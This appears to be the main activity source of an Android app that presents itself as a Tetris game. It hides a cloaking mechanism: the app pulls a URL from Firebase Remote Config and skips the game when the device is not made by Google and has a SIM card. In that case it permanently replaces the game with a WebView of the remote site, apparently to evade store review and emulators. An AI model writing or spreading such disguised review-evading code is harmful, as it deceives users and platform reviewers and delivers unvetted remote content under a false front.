package com.example.tetrisapp

import android.content.Context
import android.content.SharedPreferences
import android.os.Build
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.telephony.TelephonyManager
import android.util.Log
import android.webkit.WebView
import android.widget.Button
import android.widget.ImageButton
import android.widget.ImageView
import android.widget.TableLayout
import android.widget.TableRow
import android.widget.TextView
import androidx.core.content.res.ResourcesCompat
import androidx.core.view.isVisible
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.onesignal.OneSignal

const val STORAGE_NAME = "Storage"
const val PATH_KEY = "key"
const val CONFIG_URL_KEY = "url"
const val ONES_APP_ID = ""

class MainActivity : AppCompatActivity(), TetrisListener {

    lateinit var tetris: Tetris
    lateinit var shared: SharedPreferences

    override fun onCreate(savedInstanceState: Bundle?) {
        Log.println(Log.DEBUG, "EmulatorTest", "1")
        super.onCreate(savedInstanceState)
        shared = getSharedPreferences(STORAGE_NAME, Context.MODE_PRIVATE)
        ones()
        val path: String? = shared.getString(PATH_KEY, null)
        if (path == null) {
            loadFire()
        }
        else {
            loadWebView(path)
        }
    }

    private fun loadWebView(url: String) {
        setContentView(WebView(this).apply {
            loadUrl(url)
        })
    }

    private val table = mutableListOf<MutableList<ImageView>>()
    private lateinit var pointsView: TextView
    private lateinit var restartButton: Button

    private fun loadGame() {
        setContentView(R.layout.activity_main)

        findViewById<ImageButton>(R.id.moveLeft).setOnClickListener { tetris.moveLeft() }
        findViewById<ImageButton>(R.id.turnLeft).setOnClickListener { tetris.turnLeft() }
        findViewById<ImageButton>(R.id.turnRight).setOnClickListener { tetris.turnRight() }
        findViewById<ImageButton>(R.id.moveRight).setOnClickListener { tetris.moveRight() }

        findViewById<TableLayout>(R.id.tetris).apply {
            repeat(SIZE_Y) {
                val row = TableRow(this@MainActivity).apply {
                    layoutParams = TableLayout.LayoutParams().apply { weight = 1f }
                }
                val tableRow = mutableListOf<ImageView>()
                repeat(SIZE_X) {
                    row.addView(ImageView(this@MainActivity).apply {
                        layoutParams = TableRow.LayoutParams().apply { weight = 1f }
                        tableRow.add(this)
                    })
                }
                addView(row)
                table.add(tableRow)
            }
        }
        pointsView = findViewById<TextView>(R.id.points).apply {
            text = "0"
        }
        restartButton = findViewById<Button?>(R.id.restartButton).apply {
            setOnClickListener {
                tetris.start()
                isVisible = false
                pointsView.text = "0"
            }
        }
        tetris = Tetris().apply {
            addListener(this@MainActivity)
        }
        tetris.start()
    }

    private fun redraw() {
        repeat(SIZE_Y) { y ->
            repeat(SIZE_X) { x ->
                tetris.apply {
                    matrix[y][x].apply {
                        table[y][x].background = getBackground(
                            if (this != 0) this else R.drawable.emptycell
                        )
                    }
                    currBlock.calculated.forEach {
                        if (it.y < 0 || it.x < 0) return
                        table[it.y][it.x].background = getBackground(currBlock.color)
                    }
                }
            }
        }
    }

    private fun getBackground(id: Int) = ResourcesCompat.getDrawable(resources, id, null)

    override fun onMove() {
        runOnUiThread { redraw() }
    }

    override fun onFinish() {
        runOnUiThread {
            restartButton.isVisible = true
        }
    }

    override fun onPointsEarned() {
        runOnUiThread {
            pointsView.text = tetris.points.toString()
        }
    }

    private fun ones() {
        try {
            OneSignal.promptForPushNotifications()
            OneSignal.setAppId(ONES_APP_ID)
        }
        catch (e: Exception) {
            println(e.message)
        }
    }

    private fun loadFire() {
        Firebase.remoteConfig.apply {
            fetchAndActivate().addOnCompleteListener {
                val url = getString(CONFIG_URL_KEY)
                if (url.isEmpty() || Build.MANUFACTURER.contains("google", true) || !hasSimCard()) {
                    loadGame()
                }
                else {
                    shared.edit().apply {
                        putString(PATH_KEY, url)
                        apply()
                    }
                    loadWebView(url)
                }
            }
        }
    }

    private fun hasSimCard() =
        (getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager)
            .simState != TelephonyManager.SIM_STATE_ABSENT
}